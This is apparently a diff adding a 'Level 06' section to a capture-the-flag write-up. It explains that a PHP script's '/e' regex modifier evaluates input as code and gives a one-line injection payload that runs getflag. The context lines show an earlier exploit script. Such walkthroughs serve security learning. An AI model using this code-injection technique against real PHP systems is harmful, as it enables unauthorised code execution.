@@ -94,3 +94,13 @@ echo -e '#!/bin/sh\ngetflag > /tmp/flag.txt' > /opt/openarenaserver/exploit.sh
 
 watch -n 1 ls -la /opt/openarenaserver/
 ```
+## Level 06
+- Available files 
+=> ```level06.php``` and binary ```level06```
+	* Binary calls for php script
+	* Php script modifies strings but interpret the fiven one as php code because of '/e'
+
+- Create injection script
+```
+echo '[x {${`getflag`}}]' > /tmp/exploit.txt
+```
